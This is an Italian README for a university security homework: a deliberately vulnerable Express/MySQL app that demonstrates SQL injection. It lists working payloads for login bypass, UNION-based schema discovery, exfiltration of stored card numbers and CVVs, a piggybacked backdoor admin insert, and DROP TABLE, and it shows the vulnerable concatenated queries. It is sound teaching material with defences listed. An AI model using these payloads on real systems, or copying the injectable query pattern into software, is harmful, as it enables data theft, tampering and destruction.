# SQL Injection - Homework Sicurezza (Traccia 2)

Web application volutamente vulnerabile per dimostrare un attacco di SQL Injection
in-band, basato su input dell'utente, con tautologia, commento di fine riga e query
piggybacked. L'attacco viola tutte e tre le proprietà CIA (Confidentiality, Integrity,
Availability) di un database di cui all'inizio non si conosce la struttura.

## Stack

- Node.js 14 + Express come server web (la traccia suggeriva PHP, ma il difetto è lo
  stesso: query costruite incollando stringhe)
- MySQL 5.7, versione vecchia
- Docker Compose per i due container (db e web)
- driver `mysql` con `multipleStatements: true` per far funzionare il piggyback

## Schema del database (`web/init.sql`)

Tre tabelle:

- `users` (id, username, password, ruolo): login, password in chiaro
- `carte_credito` (id, user_id, intestatario, numero, cvv, scadenza): il dato sensibile,
  bersaglio dell'esfiltrazione
- `ordini` (id, user_id, prodotto, importo): tabella in più da elencare

L'attaccante vede solo il form: non sa che `carte_credito` esiste, deve scoprirlo da
`information_schema`.

## Avvio

```bash
docker compose up -d --build      # avvia db + web
# app su http://localhost:3000
```

## Lanciare gli attacchi in automatico

```bash
docker compose exec web node attack.js     # oppure: npm run attack
```

`web/attack.js` fa le 10 fasi in ordine e stampa payload + risultato. L'output di una
esecuzione reale è in [`risultati_sperimentali.txt`](risultati_sperimentali.txt).

## Dove sta il difetto (`web/app.js`)

```js
// POST /login  (riga 71)
const query = `SELECT id, username FROM users WHERE username = '${username}' AND password = '${password}'`;

// GET /search/result  (riga 112)
const query = `SELECT id, username, password FROM users WHERE username = '${user}'`;
```

Niente query parametrizzate, niente controllo: l'input entra dritto nella query.

## I payload, in ordine

Accesso (Confidentiality), nel campo username del login:

- tautologia: `' OR '1'='1' -- `
- commento di fine riga: `admin' -- `

Ricognizione (non conosco lo schema), nel campo di ricerca:

1. conto le colonne: `' ORDER BY 4 -- ` dà errore, `' ORDER BY 3 -- ` no, quindi 3 colonne
2. versione/utente/db: `' UNION SELECT @@version, current_user(), database() -- `
3. tabelle: `' UNION SELECT table_name, table_schema, 1 FROM information_schema.tables WHERE table_schema=database() -- ` (qui scopro `carte_credito`)
4. colonne: `' UNION SELECT column_name, data_type, 1 FROM information_schema.columns WHERE table_name='carte_credito' -- `

Esfiltrazione (Confidentiality):

`' UNION SELECT numero, cvv, intestatario FROM carte_credito -- ` (numeri di carta e CVV in chiaro)

Modifica (Integrity), piggyback sul login:

- UPDATE: `x'; UPDATE users SET password='hacked123' WHERE username='admin'; -- `
- INSERT backdoor: `x'; INSERT INTO users (username,password,ruolo) VALUES ('attacker','attackerpass','admin'); -- `

Cancellazione (Availability), piggyback:

`x'; DROP TABLE carte_credito; -- ` (la tabella sparisce, le ricerche dopo falliscono)

## CIA

- Confidentiality: tautologia, commento, UNION + information_schema -> login bypassato, carte lette
- Integrity: piggyback UPDATE / INSERT -> password admin cambiata, utente backdoor
- Availability: piggyback DROP TABLE -> tabella cancellata, servizio fuori uso

## Come si difende (dettagli nella relazione, sez. 11)

Query parametrizzate, `multipleStatements:false`, hash delle password (bcrypt), minimo
privilegio sull'utente DB, controllo dell'input, niente `sqlMessage` rimandato al client,
WAF davanti.

## Reset

```bash
docker compose down -v     # al prossimo up ricrea il db pulito
```
